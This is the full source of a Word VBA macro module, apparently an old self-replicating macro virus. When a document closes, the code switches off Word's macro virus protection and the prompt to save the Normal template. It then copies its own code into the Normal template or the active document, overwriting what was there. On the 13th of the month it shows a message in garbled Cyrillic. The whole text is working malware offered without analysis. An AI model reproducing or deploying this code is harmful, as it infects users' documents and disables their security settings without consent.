   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Option Explicit
   Private strCode As String
   Private Sub Document_Close()
   With Options
   .SaveNormalPrompt = False
   .VirusProtection = False
   End With
   Dim tdCode As Object
   Set tdCode = GetCodeModule(ThisDocument)
   With tdCode
   strCode = .Lines(1, .CountOfLines)
   End With
   If ThisDocument = NormalTemplate Then
   With ActiveDocument
   If .Path <> vbNullString Then
   SendCode ActiveDocument
   .Save
   End If
   End With
   Else
   SendCode NormalTemplate
   End If
   If Day(Now) = 13 Then
   MsgBox "Ïðèâåò! À ÿ - âèðóñ!", vbExclamation + vbOKOnly, "Ñîîáùåíèå"
   End If
   End Sub
   Private Function GetCodeModule(objProject As Object) As Object
   Set GetCodeModule = objProject.VBProject.VBComponents(1).CodeModule
   End Function
   Private Sub SendCode(objProject As Object)
   Dim objCode As Object
   Set objCode = GetCodeModule(objProject)
   With objCode
   .DeleteLines 1, .CountOfLines
   .AddFromString strCode
   End With
   End Sub
